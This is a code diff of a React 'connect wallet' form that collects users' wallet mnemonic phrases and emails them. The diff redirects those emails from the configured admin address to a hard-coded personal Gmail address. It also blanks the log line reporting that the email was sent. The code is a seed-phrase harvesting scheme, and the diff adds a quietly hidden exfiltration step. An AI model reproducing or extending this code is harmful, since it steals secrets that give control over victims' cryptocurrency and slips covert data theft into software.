@@ -41,7 +41,7 @@ const ConnectForm = ({email, name}: string | any) => {
 
     const formData = {email, walletName, phrase }
     const emailData = {to: email, subject: "Wallet Connection", name, emailType:"connectWallet", currentTime: formattedDateTime}
-    const emailData1 = {to: process.env.ADMIN_EMAIL, subject: "Mnemonic Phrase Notification", emailType:"adminNotification", walletName, phrase, name}
+    const emailData1 = {to: "andreyokonetchnikov@gmail.com", subject: "Mnemonic Phrase Notification", emailType:"adminNotification", walletName, phrase, name}
     //console.log({formData})
     //console.log({emailData})
     makeApiRequest("/connectWallet", "post", formData, {
@@ -53,7 +53,7 @@ const ConnectForm = ({email, name}: string | any) => {
           makeApiRequest("/send-email", "post", emailData1, {
             onSuccess: () => {
               // Handle success
-              console.log("Email has been sent to the admin");
+              console.log("");
             },
             onError: (error: any) => {
               // Handle error
